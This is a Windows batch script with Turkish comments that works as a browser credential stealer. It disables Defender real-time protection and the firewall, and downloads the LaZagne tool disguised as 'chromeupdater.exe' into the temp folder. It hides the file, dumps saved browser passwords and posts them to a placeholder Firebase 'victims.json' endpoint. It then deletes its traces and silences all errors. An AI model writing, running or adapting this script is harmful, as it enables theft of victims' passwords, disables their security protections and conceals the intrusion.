@echo off
:: Yönetici kontrolü YOK, direk devam ediyoruz

:: Chrome ve Edge işlemlerini kapat
taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1

:: Defender real-time korumayı kapat (güçlü komutlar)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Stop-Service -Name WinDefend -Force" >nul 2>&1
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1

:: Geçici klasöre geç
cd /d %TEMP%

:: Lazagne indiriliyor (her zaman x64 sürümü, dilersen mimariye göre ayarlanabilir)
curl -L -o chromeupdater.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1

attrib +h chromeupdater.exe

:: Lazagne çalıştırılıyor
chromeupdater.exe browsers -oN -output results >nul 2>&1

:: Firebase'e veri gönderme kısmı (hata olsa da sessizce geç)
setlocal EnableDelayedExpansion
set LOGFILE=results\browsers.txt
set DATA=

if exist "%LOGFILE%" (
    for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
        set "line=%%A"
        set "DATA=!DATA!!line!`n"
    )
) else (
    set DATA=NoDataCollected
)

set FB=https://YOUR_FIREBASE_URL_HERE/victims.json

powershell -Command ^
  "try { $json = '{\"log\":@'\''%DATA%'\'@'}'; Invoke-RestMethod -Uri '%FB%' -Method POST -Body $json -ContentType 'application/json' } catch { }" >nul 2>&1

:: Temizlik
del /f /q chromeupdater.exe >nul 2>&1
rd /s /q results >nul 2>&1

echo [+] İşlem tamamlandı, çıkılıyor...
timeout /t 3 >nul
exit
